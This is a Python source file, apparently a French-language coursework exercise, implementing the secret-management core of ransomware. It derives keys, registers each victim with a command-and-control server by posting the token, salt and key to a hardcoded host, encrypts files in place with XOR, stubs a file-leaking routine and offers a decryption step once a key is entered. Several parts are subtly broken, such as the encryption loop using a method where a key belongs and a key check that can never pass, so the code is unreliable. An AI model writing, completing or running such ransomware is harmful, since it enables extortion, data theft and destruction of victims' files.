from hashlib import sha256
import logging
import os
import secrets
from typing import List, Tuple
import os.path
import requests
import base64

from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

from xorcrypt import xorfile

class SecretManager:
    ITERATION = 48000
    TOKEN_LENGTH = 16
    SALT_LENGTH = 16
    KEY_LENGTH = 16

    def __init__(self, remote_host_port:str="172.18.0.2:6666", path:str="/root") -> None:
        self._remote_host_port = remote_host_port
        self._path = path
        self._key = None
        self._salt = None
        self._token = None

        self._log = logging.getLogger(self.__class__.__name__)

    def do_derivation(self, salt:bytes, key:bytes)->bytes:
        #raise NotImplemented()
        kdf = PBKDF2HMAC (
            algorithm = hashes.SHA256(),
            length = self.KEY_LENGTH,
            salt = salt,
            iterations = self.ITERATION,
        )
        clef_derivee = kdf.derive(key)
        return clef_derivee


    def create(self)->Tuple[bytes, bytes, bytes]:
        #raise NotImplemented()
        # création aléatoire du salt et de la clef 
        salt = secrets.token_bytes(self.SALT_LENGTH)
        key = secrets.token_bytes(self.KEY_LENGTH)
        # Hashage du salt et de la clef avec l'algorithme sha256
        hashed_salt = sha256(salt).digest()
        hashed_key = sha256(key).digest()
        # Dérivation de la clef
        derived_key = self.do_derivation(hashed_salt, hashed_key)
        return salt, hashed_key, derived_key


    def bin_to_b64(self, data:bytes)->str:
        tmp = base64.b64encode(data)
        return str(tmp, "utf8")

    def post_new(self, salt:bytes, key:bytes, token:bytes)->None:
        # register the victim to the CNC
        url = f"http://{self._remote_host_port}/new"
        # convertir les données binaires en base64 pour l'envoi dans le corps de la requête
        payload = {
            "token": self.bin_to_b64(token),
            "salt": self.bin_to_b64(salt),
            "key": self.bin_to_b64(key)
        }
        # envoyer la requête POST au CNC
        response = requests.post(url, json = payload)
        # vérifier que la requête a été effectuée avec succès
        if response.status_code != 200:
            raise ValueError("Failed to send secret data to CNC")
        #raise NotImplemented()

    def setup(self)->None:
        # main function to create crypto data and register malware to cnc
        # On vérifie si les fichiers cryptographiques exixtes, sinon on les cré
        if os.path.exists(os.path.join(self._path, "token.bin")) or os.path.exists(os.path.join(self._path, "salt.bin")) :
            print(self._path)
            raise FileExistsError('Les fichiers existent déjà')
        
        # Création des dossiers
        os.makedirs(self._path, exist_ok = True)

        # Création des éléments cryptographiques 
        salt, key, token = self.create()

        # Salt et Token
        with open(os.path.join(self._path, "salt.bin"), "wb") as f :
            f.write(salt)
        
        with open (os.path.join(self._path, "token.bin"), "wb") as f :
            f.write(token)

        derived_key = self.do_derivation(salt, key)

        self.post_new (salt, derived_key, token)

        #raise NotImplemented()

    def load(self)->None:
        # function to load crypto data
        salt_file = os.path.join(self._path, 'salt.bin')
        token_file = os.path.join(self._path, 'token.bin')

        with open(salt_file, "rb") as f :
            self._salt = f.read()

        with open(token_file, "rb") as f :
            self._token = f.read()

        self._log.info("Données chiffrées chargées avec succès")
        #raise NotImplemented()

    def check_key(self, candidate_key:bytes)->bool:
        # Assert the key is valid
        # On vérifie si la clef a la bonne taille 
        if len(candidate_key) != self.KEY_LENGTH :
            return False
        
        # Hash SHA256 de candidate_Key
        candidate_hash = sha256(candidate_key).digest() 

        # On compare 
        expected_hash = b'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
        if candidate_hash != expected_hash:
            return False
        
        return True
        #raise NotImplemented()

    def set_key(self, b64_key:str)->None:
        # If the key is valid, set the self._key var for decrypting
        # Decode de la clef encodé en base64
        candidate_key = base64.b64decode(b64_key)

        # On vérifie si la clef est valide 
        if not self.check_key(candidate_key) :
            raise ValueError("Clef invalide")
        
        self._key = candidate_key
        #raise NotImplemented()

    def get_hex_token(self)->str:
        # Should return a string composed of hex symbole, regarding the token
        with open(os.path.join(self._path, "token.bin"), "rb") as f :
            token = f.read()
        hashed_token = sha256(token).hexdigest()
        return hashed_token
        #raise NotImplemented()

    def xorfiles(self, files:List[str])->None:
        # xor a list for file
        for file in files :
            with open (file, "rb") as f :
                plaintext = f.read()

            # Chiffrement des fichiers en utilisant la clef
            encrypted = bytes([p ^ k for p, k  in zip(plaintext, self.check_key)])

            # Réecriture des données chiffrées dans le même fichier
            with open (file, "wb") as f :
                f.write(encrypted)

#        raise NotImplemented()

    def leak_files(self, files:List[str])->None:
        # send file, geniune path and token to the CNC
        raise NotImplemented()

    def clean(self):
        # remove crypto data from the target
        # charger les éléments cryptographiques locaux
        self.load()
        
        # obtenir la liste des fichiers chiffrés
        encrypted_files = self.get_encrypted_files()
        
        # boucle avec try/except pour déchiffrer chaque fichier
        for encrypted_file in encrypted_files:
            try:
                # demander la clef
                candidate_key = bytes(input("Entrez la clef pour déchiffrer le fichier {}: ".format(encrypted_file)), encoding="utf8")
                
                # vérifier la clef
                if not self.check_key(candidate_key):
                    print("Clef invalide, réessayez.")
                    continue
                
                # définir la clef
                self.set_key(self.bin_to_b64(candidate_key))
                
                # déchiffrer le fichier
                xorfile(os.path.join(self._path, encrypted_file), os.path.join(self._path, encrypted_file), self._key)
                
                # supprimer le fichier chiffré
                os.remove(os.path.join(self._path, encrypted_file))
                
                print("Fichier {} déchiffré avec succès.".format(encrypted_file))
            except Exception as e:
                print("Erreur lors du déchiffrement du fichier {}: {}".format(encrypted_file, str(e)))
        
        # supprimer les éléments cryptographiques
        self._key = None
        self._salt = None
        self._token = None
        if os.path.exists(os.path.join(self._path, "salt.bin")):
            os.remove(os.path.join(self._path, "salt.bin"))
        if os.path.exists(os.path.join(self._path, "token.bin")):
            os.remove(os.path.join(self._path, "token.bin"))
        print("Nettoyage effectué avec succès.")
        #raise NotImplemented()
